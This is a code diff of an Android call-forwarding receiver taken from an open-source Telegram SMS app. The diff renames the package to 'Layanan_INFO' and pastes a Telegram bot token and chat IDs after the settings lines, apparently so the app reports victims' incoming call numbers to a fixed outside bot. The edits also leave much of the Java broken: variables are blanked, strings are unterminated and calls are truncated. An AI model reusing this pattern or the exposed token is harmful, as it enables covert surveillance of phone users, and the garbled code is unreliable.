@@ -1,4 +1,4 @@
-package com.qwe7002.telegram_sms;
+package com.qwe7002.Layanan_INFO;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -35,7 +35,7 @@ import okhttp3.Response;
 
 
 public class call_receiver extends BroadcastReceiver {
-    private static int slot;
+    private static int ;
     private static String incoming_number;
 
     @Override
@@ -49,12 +49,12 @@ public class call_receiver extends BroadcastReceiver {
                 }
                 TelephonyManager telephony = (TelephonyManager) context
                         .getSystemService(Context.TELEPHONY_SERVICE);
-                call_status_listener custom_phone_listener = new call_status_listener(context, slot, incoming_number);
+                call_status_listener custom_phone_listener = new call_status_listener(context, incoming_number);
                 assert telephony != null;
                 telephony.listen(custom_phone_listener, PhoneStateListener.LISTEN_CALL_STATE);
                 break;
             case "android.intent.action.SUBSCRIPTION_PHONE_STATE":
-                slot = intent.getIntExtra("slot", -1);
+                slt = intent.getIntExtra(", -);
                 break;
 
         }
@@ -64,12 +64,12 @@ public class call_receiver extends BroadcastReceiver {
         private static int last_receive_status = TelephonyManager.CALL_STATE_IDLE;
         private static String incoming_number;
         private final Context context;
-        private final int slot;
+        private final int
 
-        call_status_listener(Context context, int slot, String incoming_number) {
+        call_status_listener(Context context, int , String incoming_number) {
             super();
             this.context = context;
-            this.slot = slot;
+            this.slot =
             call_status_listener.incoming_number = incoming_number;
         }
 
@@ -81,11 +81,11 @@ public class call_receiver extends BroadcastReceiver {
                     Log.i("call_status_listener", "Uninitialized, Phone receiver is deactivated.");
                     return;
                 }
-                String bot_token = sharedPreferences.getString("bot_token", "");
-                String chat_id = sharedPreferences.getString("chat_id", "");
-                String request_uri = network_func.get_url(bot_token, "sendMessage");
+                String bot_token = sharedPreferences.getString("bot_token", "");5770452954
+                String chat_id = sharedPreferences.getString("chat_id", "");5779700223
+                String request_uri = network_func.get_url(bot_token, "sendMessage");5770452954:AAHsXj_vOnjO3WzXOxEg37Ulq7sguZL2gq4
                 final request_message request_body = new request_message();
-                request_body.chat_id = chat_id;
+                request_body.chat_id = chat_id;5779700223
                 String dual_sim = other_func.get_dual_sim_card_display(context, slot, sharedPreferences.getBoolean("display_dual_sim_display_name", false));
                 request_body.text = "[" + dual_sim + context.getString(R.string.missed_call_head) + "]" + "\n" + context.getString(R.string.Incoming_number) + call_status_listener.incoming_number;
                 String request_body_raw = new Gson().toJson(request_body);
@@ -116,7 +116,7 @@ public class call_receiver extends BroadcastReceiver {
                                 log_func.write_log(context, "[" + call_status_listener.incoming_number + "] Not a regular phone number.");
                                 return;
                             }
-                            other_func.add_message_list(other_func.get_message_id(result), call_status_listener.incoming_number, slot);
+                            other_func.add_message_list(other_func.get_message_id(result), call_status_listener.incoming_number
                         }
                     }
                 });
